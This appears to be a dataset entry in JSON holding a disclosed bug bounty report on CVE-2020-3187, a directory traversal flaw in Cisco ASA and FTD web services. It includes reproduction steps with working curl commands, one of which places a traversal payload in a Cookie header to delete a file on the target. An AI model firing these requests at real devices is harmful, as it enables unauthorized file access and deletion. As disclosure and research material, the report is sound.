@@ -1,0 +1,38 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "b4dc4t ",
+  "title": "CVE-2020-3187 - Unauthenticated Arbitrary File Deletion",
+  "content": "\nA vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files on a targeted system. The vulnerability is due to a lack of proper input validation of the HTTP URL. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences.\nThe IP has a SSL certificate pointing to \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\ncurl -kv https://\u2588\u2588\u2588\noutput:\nCode 24 Bytes\n1Server certificate:\n2\u2588\u2588\u2588\u2588\nImpact\nAn exploit could allow the attacker to view or delete arbitrary files on the targeted system. When the device is reloaded after exploitation of this vulnerability, any files that were deleted are restored. The attacker can only view and delete files within the web services file system. This file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability can not be used to obtain access to ASA or FTD system files or underlying operating system (OS) files. Reloading the affected device will restore all files within the web services file system.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nCVE-2020-3187\nSteps to Reproduce\n1.First I performed a curl request to validate that /session_password.html gave a 200 response.\ncurl -k -s -i https://\u2588\u2588\u2588\u2588+CSCOE+/session_password.html\n2.Example to delete logo file \"/+CSCOU+/csco_logo.gif\".\ncurl -k -H \"Cookie: token=../+CSCOU+/csco_logo.gif\" https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588+CSCOE+/session_password.html\nNOTE: No destructive behavior was performed on target, the above command will remove csco_logo.gif and can be restored on reboot of the device\nSuggested Mitigation/Remediation Actions\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1652400000,
+  "report_url": "https://hackerone.com/reports/1555025",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Perform a curl request to validate that /session_password.html gives a 200 response: `curl -k -s -i https://\u2588\u2588\u2588\u2588+CSCOE+/session_password.html`"
+    ],
+    [
+      2,
+      "Use a crafted curl request with directory traversal in the Cookie header to delete a file: `curl -k -H \"Cookie: token=../+CSCOU+/csco_logo.gif\" https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588+CSCOE+/session_password.html`"
+    ]
+  ],
+  "vuln_description": "An unauthenticated directory traversal vulnerability in Cisco ASA and FTD software allows arbitrary file deletion via a crafted HTTP request with directory traversal sequences in the Cookie header. The vulnerability is due to improper input validation of the HTTP URL.",
+  "reason": "The vulnerability involves a straightforward directory traversal attack with a single crafted HTTP request. The attack does not require multiple components, complex state manipulation, or novel logic. The only non-obvious aspect is the use of the Cookie header for the traversal payload.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
